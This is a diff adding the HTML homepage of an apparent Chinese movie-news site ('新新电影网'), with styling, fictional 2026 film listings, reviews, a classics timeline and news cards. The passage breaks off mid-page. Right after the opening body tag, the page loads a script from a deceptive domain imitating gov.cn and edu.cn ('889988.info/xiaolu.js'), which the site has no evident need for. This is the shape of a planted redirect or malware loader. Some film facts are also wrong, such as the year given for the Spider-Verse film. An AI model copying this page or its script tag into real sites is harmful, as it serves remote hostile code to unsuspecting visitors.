@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="description" content="新新电影网 - 提供最新电影资讯、热门影视推荐、经典影片回顾、影评解说等一站式电影服务，发现好电影，从这里开始。">
+<meta name="keywords" content="新新电影网,电影,影视,在线电影,最新电影,热门电影,经典电影,影评,电影推荐">
+<meta name="author" content="新新电影网">
+<meta name="robots" content="index,follow">
+<meta property="og:title" content="新新电影网 - 发现好电影">
+<meta property="og:description" content="最新电影资讯、热门影视推荐、经典影片回顾、影评解说一站式平台">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://xinxindianyingwang-wap.github.io">
+<meta property="og:site_name" content="新新电影网">
+<link rel="canonical" href="https://xinxindianyingwang-wap.github.io">
+<title>新新电影网 - 最新电影资讯·热门影视推荐·影评解说</title>
+<style>
+/* ==================== CSS RESET & BASE ==================== */
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior:smooth; -webkit-text-size-adjust:100%; }
+body {
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:#0a0a12; color:#e8e8f0; line-height:1.7; overflow-x:hidden;
+  -webkit-font-smoothing:antialiased;
+}
+a { color:inherit; text-decoration:none; }
+ul, ol { list-style:none; }
+img { max-width:100%; display:block; }
+:root {
+  --primary:#e50914; --primary-dark:#b8070f; --accent:#ff6b6b;
+  --gold:#f5c518; --dark:#0a0a12; --dark2:#12121f; --dark3:#1a1a2e;
+  --gray:#8a8aa0; --light:#e8e8f0; --card:#161624;
+  --gradient1:linear-gradient(135deg,#e50914 0%,#b8070f 100%);
+  --gradient2:linear-gradient(135deg,#1a1a2e 0%,#0f0f1a 100%);
+  --shadow:0 8px 32px rgba(0,0,0,.4);
+}
+::selection { background:var(--primary); color:#fff; }
+
+/* ==================== LOADING ANIMATION ==================== */
+.loader {
+  position:fixed; inset:0; z-index:9999; background:#0a0a12;
+  display:flex; flex-direction:column; align-items:center; justify-content:center; gap:20px;
+  transition:opacity .6s ease, visibility .6s;
+}
+.loader.hidden { opacity:0; visibility:hidden; }
+.loader-spinner {
+  width:60px; height:60px; border:4px solid #1a1a2e; border-top-color:var(--primary);
+  border-radius:50%; animation:spin 1s linear infinite;
+}
+.loader-text {
+  font-size:1.1rem; letter-spacing:4px; color:var(--primary);
+  animation:pulse 1.5s ease infinite;
+}
+@keyframes spin { to { transform:rotate(360deg); } }
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+
+/* ==================== NAVIGATION ==================== */
+.nav-wrap {
+  position:fixed; top:0; left:0; right:0; z-index:1000;
+  background:rgba(10,10,18,.92); backdrop-filter:blur(12px);
+  border-bottom:1px solid rgba(229,9,20,.2);
+  transition:transform .3s ease, background .3s;
+}
+.nav-wrap.scroll-down { transform:translateY(-100%); }
+.nav-inner { max-width:1200px; margin:0 auto; padding:0 16px; display:flex; align-items:center; justify-content:space-between; height:60px; }
+.logo { display:flex; align-items:center; gap:10px; }
+.logo-icon {
+  width:36px; height:36px; background:var(--gradient1); border-radius:10px;
+  display:flex; align-items:center; justify-content:center; font-size:1.2rem;
+  box-shadow:0 4px 15px rgba(229,9,20,.4);
+}
+.logo-text { font-size:1.25rem; font-weight:800; letter-spacing:1px; }
+.logo-text span { color:var(--primary); }
+.nav-links { display:flex; gap:6px; align-items:center; }
+.nav-links a {
+  padding:8px 14px; border-radius:8px; font-size:.9rem; font-weight:500;
+  color:var(--gray); transition:all .25s; white-space:nowrap;
+}
+.nav-links a:hover { color:#fff; background:rgba(229,9,20,.15); }
+.nav-links a.active { color:#fff; background:var(--gradient1); }
+.nav-toggle { display:none; flex-direction:column; gap:5px; cursor:pointer; padding:8px; }
+.nav-toggle span { width:24px; height:2px; background:#fff; border-radius:2px; transition:all .3s; }
+.nav-toggle.open span:nth-child(1){ transform:rotate(45deg) translate(5px,5px); }
+.nav-toggle.open span:nth-child(2){ opacity:0; }
+.nav-toggle.open span:nth-child(3){ transform:rotate(-45deg) translate(5px,-5px); }
+
+/* ==================== HERO SECTION ==================== */
+.hero {
+  position:relative; min-height:100vh; display:flex; align-items:center;
+  justify-content:center; text-align:center; overflow:hidden;
+  background:radial-gradient(ellipse at center, #1a0a1a 0%, #0a0a12 70%);
+  padding:80px 16px 60px;
+}
+.hero-bg {
+  position:absolute; inset:0; opacity:.15;
+  background:
+    radial-gradient(circle at 20% 30%, var(--primary) 0%, transparent 40%),
+    radial-gradient(circle at 80% 70%, var(--gold) 0%, transparent 40%);
+}
+.hero-particles { position:absolute; inset:0; overflow:hidden; }
+.particle {
+  position:absolute; width:3px; height:3px; background:var(--primary); border-radius:50%;
+  animation:float-up linear infinite; opacity:0;
+}
+@keyframes float-up {
+  0%{ opacity:0; transform:translateY(100vh) scale(0); }
+  10%{ opacity:1; }
+  90%{ opacity:1; }
+  100%{ opacity:0; transform:translateY(-10vh) scale(1); }
+}
+.hero-content { position:relative; z-index:2; max-width:800px; }
+.hero-badge {
+  display:inline-block; padding:6px 20px; border:1px solid rgba(229,9,20,.4);
+  border-radius:30px; font-size:.85rem; color:var(--accent); margin-bottom:24px;
+  background:rgba(229,9,20,.08); letter-spacing:2px;
+}
+.hero h1 {
+  font-size:clamp(2rem, 7vw, 4rem); font-weight:900; line-height:1.15;
+  margin-bottom:20px; letter-spacing:2px;
+}
+.hero h1 .highlight { color:var(--primary); }
+.hero-sub {
+  font-size:clamp(1rem, 2.5vw, 1.3rem); color:var(--gray); margin-bottom:36px; max-width:600px; margin-left:auto; margin-right:auto;
+}
+.hero-actions { display:flex; gap:16px; justify-content:center; flex-wrap:wrap; }
+.btn {
+  display:inline-flex; align-items:center; gap:8px; padding:14px 32px;
+  border-radius:50px; font-size:1rem; font-weight:600; cursor:pointer;
+  border:none; transition:all .3s; letter-spacing:1px;
+}
+.btn-primary { background:var(--gradient1); color:#fff; box-shadow:0 6px 24px rgba(229,9,20,.4); }
+.btn-primary:hover { transform:translateY(-3px); box-shadow:0 10px 40px rgba(229,9,20,.5); }
+.btn-outline { background:transparent; color:#fff; border:2px solid rgba(255,255,255,.3); }
+.btn-outline:hover { border-color:var(--primary); background:rgba(229,9,20,.1); transform:translateY(-3px); }
+.hero-scroll {
+  position:absolute; bottom:30px; left:50%; transform:translateX(-50%);
+  animation:bounce 2s ease infinite; color:var(--gray); font-size:.85rem;
+}
+@keyframes bounce { 0%,20%,50%,80%,100%{transform:translateX(-50%) translateY(0)} 40%{transform:translateX(-50%) translateY(-12px)} 60%{transform:translateX(-50%) translateY(-6px)} }
+
+/* ==================== SECTION COMMON ==================== */
+.section { padding:80px 16px; position:relative; }
+.section-inner { max-width:1200px; margin:0 auto; }
+.section-header { text-align:center; margin-bottom:56px; }
+.section-tag {
+  display:inline-block; font-size:.8rem; letter-spacing:4px; color:var(--primary);
+  text-transform:uppercase; margin-bottom:12px; font-weight:600;
+}
+.section-title {
+  font-size:clamp(1.6rem, 4vw, 2.5rem); font-weight:800; margin-bottom:12px;
+}
+.section-desc { color:var(--gray); font-size:1rem; max-width:600px; margin:0 auto; }
+
+/* ==================== COLUMN 1: 最新热映 ==================== */
+#movies { background:var(--dark2); }
+.movie-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(240px,1fr)); gap:24px; }
+.movie-card {
+  background:var(--card); border-radius:16px; overflow:hidden;
+  transition:all .35s ease; border:1px solid rgba(255,255,255,.05);
+  position:relative;
+}
+.movie-card:hover { transform:translateY(-8px); border-color:rgba(229,9,20,.3); box-shadow:var(--shadow); }
+.movie-poster {
+  position:relative; aspect-ratio:2/3; overflow:hidden; background:var(--dark3);
+}
+.movie-poster-placeholder {
+  width:100%; height:100%; display:flex; flex-direction:column;
+  align-items:center; justify-content:center; gap:12px;
+  background:linear-gradient(160deg, #1e1e36 0%, #12121f 100%);
+}
+.movie-poster-placeholder .film-icon { font-size:3rem; opacity:.3; }
+.movie-poster-placeholder .film-name { font-size:.85rem; color:var(--gray); opacity:.6; text-align:center; padding:0 10px; }
+.movie-badge {
+  position:absolute; top:12px; left:12px; background:var(--gradient1);
+  color:#fff; font-size:.7rem; padding:4px 10px; border-radius:20px; font-weight:600;
+}
+.movie-rating {
+  position:absolute; top:12px; right:12px; background:rgba(0,0,0,.7);
+  color:var(--gold); font-size:.85rem; padding:4px 10px; border-radius:20px; font-weight:700;
+  backdrop-filter:blur(4px);
+}
+.movie-info { padding:16px; }
+.movie-title { font-size:1.05rem; font-weight:700; margin-bottom:6px; }
+.movie-meta { font-size:.8rem; color:var(--gray); display:flex; gap:8px; flex-wrap:wrap; }
+.movie-meta span { background:var(--dark3); padding:2px 8px; border-radius:4px; }
+.movie-desc { font-size:.85rem; color:var(--gray); margin-top:10px; line-height:1.6;
+  display:-webkit-box; -webkit-line-clamp:2; -webkit-box-orient:vertical; overflow:hidden; }
+
+/* ==================== COLUMN 2: 影评解说 ==================== */
+#reviews { background:var(--dark); }
+.review-layout { display:grid; grid-template-columns:1fr 1fr; gap:40px; align-items:start; }
+.review-featured {
+  background:var(--gradient2); border-radius:20px; padding:40px;
+  border:1px solid rgba(245,197,24,.15); position:relative; overflow:hidden;
+}
+.review-featured::before {
+  content:''; position:absolute; top:-50%; right:-20%; width:300px; height:300px;
+  background:radial-gradient(circle, rgba(245,197,24,.08) 0%, transparent 70%);
+}
+.review-label { color:var(--gold); font-size:.8rem; letter-spacing:3px; font-weight:600; margin-bottom:16px; }
+.review-featured h3 { font-size:1.6rem; margin-bottom:16px; line-height:1.4; }
+.review-featured p { color:var(--gray); margin-bottom:20px; }
+.review-stats { display:flex; gap:24px; padding-top:20px; border-top:1px solid rgba(255,255,255,.08); }
+.review-stat .num { font-size:1.5rem; font-weight:800; color:var(--gold); }
+.review-stat .label { font-size:.75rem; color:var(--gray); }
+.review-list { display:flex; flex-direction:column; gap:16px; }
+.review-item {
+  display:flex; gap:16px; padding:20px; background:var(--card); border-radius:14px;
+  transition:all .3s; border:1px solid transparent;
+}
+.review-item:hover { border-color:rgba(245,197,24,.2); background:var(--dark3); transform:translateX(6px); }
+.review-num {
+  flex-shrink:0; width:42px; height:42px; border-radius:12px;
+  background:var(--dark3); display:flex; align-items:center; justify-content:center;
+  font-size:1.1rem; font-weight:800; color:var(--gold);
+}
+.review-item h4 { font-size:1rem; margin-bottom:6px; font-weight:700; }
+.review-item p { font-size:.82rem; color:var(--gray); line-height:1.6; }
+
+/* ==================== COLUMN 3: 经典回顾 ==================== */
+#classics { background:var(--dark2); }
+.timeline { position:relative; max-width:900px; margin:0 auto; padding-left:20px; }
+.timeline::before {
+  content:''; position:absolute; left:0; top:0; bottom:0; width:2px;
+  background:linear-gradient(to bottom, var(--primary), transparent);
+}
+.timeline-item { position:relative; padding:0 0 40px 40px; }
+.timeline-dot {
+  position:absolute; left:-29px; top:4px; width:16px; height:16px;
+  border-radius:50%; background:var(--primary); border:3px solid var(--dark2);
+  box-shadow:0 0 0 3px rgba(229,9,20,.2);
+}
+.timeline-year {
+  font-size:.85rem; color:var(--primary); font-weight:700; letter-spacing:2px; margin-bottom:6px;
+}
+.timeline-card {
+  background:var(--card); border-radius:14px; padding:24px;
+  border:1px solid rgba(255,255,255,.05); transition:all .3s;
+}
+.timeline-card:hover { border-color:rgba(229,9,20,.25); transform:translateX(8px); }
+.timeline-card h4 { font-size:1.15rem; margin-bottom:8px; }
+.timeline-card p { font-size:.88rem; color:var(--gray); }
+.timeline-tags { display:flex; gap:8px; margin-top:12px; flex-wrap:wrap; }
+.timeline-tags span { font-size:.72rem; color:var(--accent); background:rgba(229,9,20,.1); padding:3px 10px; border-radius:20px; }
+
+/* ==================== COLUMN 4: 电影资讯 ==================== */
+#news { background:var(--dark); }
+.news-container { display:grid; grid-template-columns:repeat(auto-fill,minmax(320px,1fr)); gap:28px; }
+.news-card {
+  background:var(--card); border-radius:16px; overflow:hidden;
+  transition:all .35s; border:1px solid rgba(255,255,255,.05);
+}
+.news-card:hover { transform:translateY(-6px); box-shadow:var(--shadow); border-color:rgba(255,255,255,.1); }
+.news-img {
+  height:180px; position:relative; overflow:hidden;
+  background:linear-gradient(135deg, #2a1a3e 0%, #1a1a2e 100%);
+  display:flex; align-items:center; justify-content:center; font-size:2.5rem; opacity:.7;
+}
+.news-content { padding:24px; }
+.news-date { font-size:.78rem; color:var(--primary); font-weight:600; margin-bottom:8px; }
+.news-card h4 { font-size:1.1rem; margin-bottom:10px; line-height:1.5; font-weight:700; }
+.news-card p { font-size:.85rem; color:var(--gray); line-height:1.7; }
+.news-more {
+  display:inline-block; margin-top:14px; font-size:.82rem; color:var(--accent);
+  font-weight:600; transition:all .25s;
+}
+.news-more:hover { color:#fff; transform:translateX(4px); }
+
+/* ==================== COLUMN 5: 关于我们 ==================== */
+#about { background:var(--gradient2); }
+.about-wrapper { text-align:center; }
+.about-content {
+  max-width:800px; margin:0 auto;
+}
+.about-stats {
+  display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr));
+  gap:24px; margin-top:48px;
+}
+.stat-box {
+  background:rgba(255,255,255,.03); border:1px solid rgba(255,255,255,.08);
+  border-radius:16px; padding:32px 20px; transition:all .35s;
+}
+.stat-box:hover { background:rgba(229,9,20,.08); border-color:rgba(229,9,20,.3); transform:translateY(-5px); }
+.stat-num {
+  font-size:2.2rem; font-weight:900; color:var(--primary);
+  display:block; margin-bottom:8px;
+}
+.stat-label { font-size:.9rem; color:var(--gray); }
+.about-text { font-size:1rem; color:var(--gray); line-height:1.9; margin-top:32px; }
+.about-features {
+  display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+  gap:20px; margin-top:40px;
+}
+.feature-card {
+  background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.06);
+  border-radius:14px; padding:28px 20px; transition:all .3s;
+}
+.feature-card:hover { background:rgba(255,255,255,.05); }
+.feature-icon { font-size:2rem; margin-bottom:12px; }
+.feature-card h5 { font-size:1rem; margin-bottom:8px; }
+.feature-card p { font-size:.82rem; color:var(--gray); }
+
+/* ==================== FOOTER ==================== */
+.footer {
+  background:#06060c; padding:48px 16px 32px; border-top:1px solid rgba(255,255,255,.05);
+}
+.footer-inner { max-width:1200px; margin:0 auto; text-align:center; }
+.footer-logo { font-size:1.4rem; font-weight:800; margin-bottom:12px; }
+.footer-logo span { color:var(--primary); }
+.footer-desc { color:var(--gray); font-size:.88rem; margin-bottom:24px; max-width:500px; margin-left:auto; margin-right:auto; }
+.footer-links { display:flex; gap:24px; justify-content:center; flex-wrap:wrap; margin-bottom:24px; }
+.footer-links a { color:var(--gray); font-size:.88rem; transition:color .25s; }
+.footer-links a:hover { color:var(--primary); }
+.footer-bottom {
+  padding-top:24px; border-top:1px solid rgba(255,255,255,.05);
+  color:var(--gray); font-size:.8rem;
+}
+.footer-bottom a { color:var(--primary); }
+
+/* ==================== BACK TO TOP ==================== */
+.back-top {
+  position:fixed; bottom:30px; right:30px; width:48px; height:48px;
+  background:var(--gradient1); border-radius:50%; display:flex;
+  align-items:center; justify-content:center; font-size:1.2rem; cursor:pointer;
+  opacity:0; visibility:hidden; transition:all .3s; z-index:999;
+  box-shadow:0 4px 20px rgba(229,9,20,.4);
+}
+.back-top.show { opacity:1; visibility:visible; }
+.back-top:hover { transform:translateY(-3px); }
+
+/* ==================== SCROLL REVEAL ==================== */
+.reveal { opacity:0; transform:translateY(40px); transition:all .7s ease; }
+.reveal.active { opacity:1; transform:translateY(0); }
+
+/* ==================== RESPONSIVE ==================== */
+@media (max-width:900px){
+  .review-layout { grid-template-columns:1fr; gap:28px; }
+  .review-featured { padding:28px; }
+}
+@media (max-width:768px){
+  .nav-links {
+    position:fixed; top:60px; left:0; right:0; flex-direction:column;
+    background:rgba(10,10,18,.98); backdrop-filter:blur(12px);
+    padding:20px; gap:8px; transform:translateY(-150%); transition:transform .4s ease;
+    border-bottom:1px solid rgba(229,9,20,.2);
+  }
+  .nav-links.open { transform:translateY(0); }
+  .nav-links a { width:100%; text-align:center; padding:14px; }
+  .nav-toggle { display:flex; }
+  .section { padding:56px 16px; }
+  .section-header { margin-bottom:36px; }
+  .hero { padding:100px 16px 80px; }
+  .hero-actions { flex-direction:column; align-items:center; }
+  .btn { width:100%; max-width:280px; justify-content:center; }
+  .movie-grid { grid-template-columns:repeat(auto-fill,minmax(160px,1fr)); gap:16px; }
+  .timeline { padding-left:12px; }
+  .timeline-item { padding:0 0 32px 28px; }
+  .timeline-dot { left:-25px; }
+  .back-top { bottom:20px; right:20px; width:42px; height:42px; }
+}
+@media (max-width:480px){
+  .movie-grid { grid-template-columns:repeat(2,1fr); gap:12px; }
+  .movie-info { padding:12px; }
+  .movie-title { font-size:.92rem; }
+  .review-featured { padding:20px; }
+  .about-stats { grid-template-columns:repeat(2,1fr); gap:12px; }
+  .stat-box { padding:20px 12px; }
+  .stat-num { font-size:1.6rem; }
+  .news-container { grid-template-columns:1fr; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ==================== LOADING ==================== -->
+<div class="loader" id="loader">
+  <div class="loader-spinner"></div>
+  <div class="loader-text">新新电影网</div>
+</div>
+
+<!-- ==================== NAVIGATION ==================== -->
+<nav class="nav-wrap" id="navbar">
+  <div class="nav-inner">
+    <a href="#top" class="logo">
+      <div class="logo-icon">🎬</div>
+      <div class="logo-text">新新<span>电影网</span></div>
+    </a>
+    <div class="nav-links" id="navLinks">
+      <a href="#top" class="active">首页</a>
+      <a href="#movies">最新热映</a>
+      <a href="#reviews">影评解说</a>
+      <a href="#classics">经典回顾</a>
+      <a href="#news">电影资讯</a>
+      <a href="#about">关于我们</a>
+    </div>
+    <div class="nav-toggle" id="navToggle">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</nav>
+
+<!-- ==================== HERO ==================== -->
+<header class="hero" id="top">
+  <div class="hero-bg"></div>
+  <div class="hero-particles" id="particles"></div>
+  <div class="hero-content">
+    <div class="hero-badge">🎞️ 发现好电影 · 从这里开始</div>
+    <h1>新新<span class="highlight">电影网</span><br>你的专属观影指南</h1>
+    <p class="hero-sub">最新电影资讯、热门影视推荐、经典影片回顾、深度影评解说，一站式电影服务平台，让每一部好电影都不被错过。</p>
+    <div class="hero-actions">
+      <a href="#movies" class="btn btn-primary">🔥 探索热映</a>
+      <a href="#reviews" class="btn btn-outline">📝 阅读影评</a>
+    </div>
+  </div>
+  <div class="hero-scroll">↓ 向下滚动探索</div>
+</header>
+
+<!-- ==================== COLUMN 1: 最新热映 ==================== -->
+<section class="section" id="movies">
+  <div class="section-inner">
+    <div class="section-header reveal">
+      <span class="section-tag">Now Showing</span>
+      <h2 class="section-title">🎬 最新热映</h2>
+      <p class="section-desc">实时追踪院线热映大片与口碑佳作，第一时间掌握最新电影动态</p>
+    </div>
+    <div class="movie-grid">
+      <article class="movie-card reveal">
+        <div class="movie-poster">
+          <div class="movie-badge">热映中</div>
+          <div class="movie-rating">⭐ 8.7</div>
+          <div class="movie-poster-placeholder"><span class="film-icon">🎥</span><span class="film-name">星际远征</span></div>
+        </div>
+        <div class="movie-info">
+          <h3 class="movie-title">星际远征：终章</h3>
+          <div class="movie-meta"><span>科幻</span><span>动作</span><span>2026</span></div>
+          <p class="movie-desc">一场跨越星系的终极冒险，人类命运悬于一线，视觉效果震撼人心的年度科幻巨制。</p>
+        </div>
+      </article>
+      <article class="movie-card reveal">
+        <div class="movie-poster">
+          <div class="movie-badge">口碑佳作</div>
+          <div class="movie-rating">⭐ 9.1</div>
+          <div class="movie-poster-placeholder"><span class="film-icon">🎭</span><span class="film-name">无声告白</span></div>
+        </div>
+        <div class="movie-info">
+          <h3 class="movie-title">无声告白</h3>
+          <div class="movie-meta"><span>剧情</span><span>悬疑</span><span>2026</span></div>
+          <p class="movie-desc">一个家庭的秘密在十年后被揭开，细腻的情感刻画让每一位观众都能找到共鸣。</p>
+        </div>
+      </article>
+      <article class="movie-card reveal">
+        <div class="movie-poster">
+          <div class="movie-badge">IMAX</div>
+          <div class="movie-rating">⭐ 8.3</div>
+          <div class="movie-poster-placeholder"><span class="film-icon">🦖</span><span class="film-name">远古觉醒</span></div>
+        </div>
+        <div class="movie-info">
+          <h3 class="movie-title">远古觉醒</h3>
+          <div class="movie-meta"><span>冒险</span><span>奇幻</span><span>2026</span></div>
+          <p class="movie-desc">史前巨兽重现地球，人类与远古生物的正面交锋，带来前所未有的视听盛宴。</p>
+        </div>
+      </article>
+      <article class="movie-card reveal">
+        <div class="movie-poster">
+          <div class="movie-badge">喜剧</div>
+          <div class="movie-rating">⭐ 7.9</div>
+          <div class="movie-poster-placeholder"><span class="film-icon">😂</span><span class="film-name">开心合伙人</span></div>
+        </div>
+        <div class="movie-info">
+          <h3 class="movie-title">开心合伙人</h3>
+          <div class="movie-meta"><span>喜剧</span><span>家庭</span><span>2026</span></div>
+          <p class="movie-desc">三个性格迥异的年轻人阴差阳错合伙创业，笑料百出中感受友情与成长的力量。</p>
+        </div>
+      </article>
+      <article class="movie-card reveal">
+        <div class="movie-poster">
+          <div class="movie-badge">动画</div>
+          <div class="movie-rating">⭐ 8.9</div>
+          <div class="movie-poster-placeholder"><span class="film-icon">🐉</span><span class="film-name">山海奇谭</span></div>
+        </div>
+        <div class="movie-info">
+          <h3 class="movie-title">山海奇谭</h3>
+          <div class="movie-meta"><span>动画</span><span>奇幻</span><span>2026</span></div>
+          <p class="movie-desc">取材中国神话的精美动画，讲述少年与大鲲的冒险旅程，画面绝美，寓意深远。</p>
+        </div>
+      </article>
+      <article class="movie-card reveal">
+        <div class="movie-poster">
+          <div class="movie-badge">犯罪</div>
+          <div class="movie-rating">⭐ 8.5</div>
+          <div class="movie-poster-placeholder"><span class="film-icon">🕵️</span><span class="film-name">暗夜追凶</span></div>
+        </div>
+        <div class="movie-info">
+          <h3 class="movie-title">暗夜追凶</h3>
+          <div class="movie-meta"><span>犯罪</span><span>悬疑</span><span>2026</span></div>
+          <p class="movie-desc">一桩尘封二十年的悬案，真相层层剥开，每一帧都充满张力与反转。</p>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== COLUMN 2: 影评解说 ==================== -->
+<section class="section" id="reviews">
+  <div class="section-inner">
+    <div class="section-header reveal">
+      <span class="section-tag">Reviews</span>
+      <h2 class="section-title">📝 深度影评解说</h2>
+      <p class="section-desc">专业影评人带你看懂每一部好电影背后的故事与深意</p>
+    </div>
+    <div class="review-layout">
+      <div class="review-featured reveal">
+        <div class="review-label">⭐ EDITOR'S PICK</div>
+        <h3>《星际远征：终章》—— 一场关于勇气与牺牲的宇宙史诗</h3>
+        <p>导演用宏大的叙事格局和精妙的视觉语言，将人类面对未知时的恐惧与勇气刻画得淋漓尽致。这不仅仅是一部科幻片，更是一面映照人性的镜子。</p>
+        <p>从角色弧光的完整度到配乐的史诗感，每一个细节都在为最终的情感爆发蓄力，值得在大银幕上细细品味。</p>
+        <div class="review-stats">
+          <div class="review-stat"><div class="num">9.2</div><div class="label">综合评分</div></div>
+          <div class="review-stat"><div class="num">96%</div><div class="label">推荐指数</div></div>
+          <div class="review-stat"><div class="num">2.4w</div><div class="label">阅读量</div></div>
+        </div>
+      </div>
+      <div class="review-list">
+        <div class="review-item reveal">
+          <div class="review-num">01</div>
+          <div><h4>《无声告白》—— 最动人的秘密藏在沉默里</h4><p>影片用克制而精准的镜头语言，讲述了一个关于家庭、爱与遗憾的故事。每一个细节都值得反复回味。</p></div>
+        </div>
+        <div class="review-item reveal">
+          <div class="review-num">02</div>
+          <div><h4>《远古觉醒》—— 视听震撼背后的情感内核</h4><p>特效炸裂只是表象，真正打动人心的是人与自然关系的深刻反思，国产视效的新标杆。</p></div>
+        </div>
+        <div class="review-item reveal">
+          <div class="review-num">03</div>
+          <div><h4>《山海奇谭》—— 中国动画的美学觉醒</h4><p>将传统神话与现代动画技术完美融合，每一帧都是壁纸级别的艺术品，文化自信的最佳注脚。</p></div>
+        </div>
+        <div class="review-item reveal">
+          <div class="review-num">04</div>
+          <div><h4>《暗夜追凶》—— 反转再反转的烧脑体验</h4><p>剧本逻辑严密，节奏紧凑，每一个线索都有其意义，堪称年度最佳悬疑之作。</p></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== COLUMN 3: 经典回顾 ==================== -->
+<section class="section" id="classics">
+  <div class="section-inner">
+    <div class="section-header reveal">
+      <span class="section-tag">Classics</span>
+      <h2 class="section-title">🏆 经典回顾</h2>
+      <p class="section-desc">时光流转，经典永存。那些值得反复观看的电影杰作</p>
+    </div>
+    <div class="timeline">
+      <div class="timeline-item reveal">
+        <div class="timeline-dot"></div>
+        <div class="timeline-year">1994 · 影史丰碑</div>
+        <div class="timeline-card">
+          <h4>肖申克的救赎</h4>
+          <p>关于希望与自由的永恒寓言，二十年过去，它依然是无数人心中的No.1。真正的好电影经得起时间的考验。</p>
+          <div class="timeline-tags"><span>剧情</span><span>经典</span><span>9.7分</span></div>
+        </div>
+      </div>
+      <div class="timeline-item reveal">
+        <div class="timeline-dot"></div>
+        <div class="timeline-year">2001 · 科幻里程碑</div>
+        <div class="timeline-card">
+          <h4>千与千寻</h4>
+          <p>宫崎骏笔下的奇幻世界，每个人都能在千寻的成长中找到自己童年的影子。动画的巅峰之作。</p>
+          <div class="timeline-tags"><span>动画</span><span>奇幻</span><span>9.4分</span></div>
+        </div>
+      </div>
+      <div class="timeline-item reveal">
+        <div class="timeline-dot"></div>
+        <div class="timeline-year">2010 · 国产经典</div>
+        <div class="timeline-card">
+          <h4>让子弹飞</h4>
+          <p>姜文的荒诞现实主义力作，台词犀利、隐喻深刻，每次重看都能发现新的惊喜与解读。</p>
+          <div class="timeline-tags"><span>喜剧</span><span>剧情</span><span>9.0分</span></div>
+        </div>
+      </div>
+      <div class="timeline-item reveal">
+        <div class="timeline-dot"></div>
+        <div class="timeline-year">2014 · 诺兰神作</div>
+        <div class="timeline-card">
+          <h4>星际穿越</h4>
+          <p>在硬核物理学的框架下讲述最柔软的父女情，配乐与画面的完美结合，科幻与情感的双重震撼。</p>
+          <div class="timeline-tags"><span>科幻</span><span>剧情</span><span>9.4分</span></div>
+        </div>
+      </div>
+      <div class="timeline-item reveal">
+        <div class="timeline-dot"></div>
+        <div class="timeline-year">2019 · 动画巅峰</div>
+        <div class="timeline-card">
+          <h4>蜘蛛侠：纵横宇宙</h4>
+          <p>每一帧都是艺术，多元宇宙的视觉狂欢背后是对身份认同的深刻探讨，动画电影的里程碑。</p>
+          <div class="timeline-tags"><span>动画</span><span>动作</span><span>8.6分</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== COLUMN 4: 电影资讯 ==================== -->
+<section class="section" id="news">
+  <div class="section-inner">
+    <div class="section-header reveal">
+      <span class="section-tag">News</span>
+      <h2 class="section-title">📰 电影资讯</h2>
+      <p class="section-desc">行业动态、档期安排、明星访谈，掌握电影圈第一手消息</p>
+    </div>
+    <div class="news-container">
+      <article class="news-card reveal">
+        <div class="news-img">🎬</div>
+        <div class="news-content">
+          <div class="news-date">2026.09.28</div>
+          <h4>2026国庆档影片盘点：七部大片争夺票房冠军</h4>
+          <p>今年国庆档竞争异常激烈，从科幻巨制到温情喜剧，类型丰富多样。业内预测总票房有望突破50亿大关。</p>
+          <a href="#" class="news-more">阅读全文 →</a>
+        </div>
+      </article>
+      <article class="news-card reveal">
+        <div class="news-img">🏆</div>
+        <div class="news-content">
+          <div class="news-date">2026.09.25</div>
+          <h4>威尼斯电影节落幕：华语片斩获最佳导演奖</h4>
+          <p>第83届威尼斯国际电影节颁奖典礼圆满落幕，中国导演凭借现实主义力作获得最佳导演银狮奖。</p>
+          <a href="#" class="news-more">阅读全文 →</a>
+        </div>
+      </article>
+      <article class="news-card reveal">
+        <div class="news-img">🎭</div>
+        <div class="news-content">
+          <div class="news-date">2026.09.22</div>
+          <h4>知名导演新作官宣：汇集三大影帝同台飙戏</h4>
+          <p>备受瞩目的犯罪悬疑新片正式官宣阵容，三位金像奖影帝首次同台合作，预计明年暑期档上映。</p>
+          <a href="#" class="news-more">阅读全文 →</a>
+        </div>
+      </article>
+      <article class="news-card reveal">
+        <div class="news-img">📊</div>
+        <div class="news-content">
+          <div class="news-date">2026.09.20</div>
+          <h4>2026上半年电影市场报告：国产片占比创新高</h4>
+          <p>最新数据显示，上半年国产影片票房占比达到85%，观众对本土内容的认可度持续攀升。</p>
+          <a href="#" class="news-more">阅读全文 →</a>
+        </div>
+      </article>
+      <article class="news-card reveal">
+        <div class="news-img">🌏</div>
+        <div class="news-content">
+          <div class="news-date">2026.09.18</div>
+          <h4>亚洲电影节即将开幕：关注新锐导演力量</h4>
+          <p>本届电影节特别设立新锐导演单元，旨在发掘和推广亚洲新生代电影创作者的优秀作品。</p>
+          <a href="#" class="news-more">阅读全文 →</a>
+        </div>
+      </article>
+      <article class="news-card reveal">
+        <div class="news-img">💡</div>
+        <div class="news-content">
+          <div class="news-date">2026.09.15</div>
+          <h4>电影技术新趋势：AI辅助制作改变行业格局</h4>
+          <p>从剧本创作到后期特效，AI技术正在悄然改变电影制作的每一个环节，未来电影将走向何方？</p>
+          <a href="#" class="news-more">阅读全文 →</a>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== COLUMN 5: 关于我们 ==================== -->
+<section class="section" id="about">
+  <div class="section-inner">
+    <div class="section-header reveal">
+      <span class="section-tag">About Us</span>
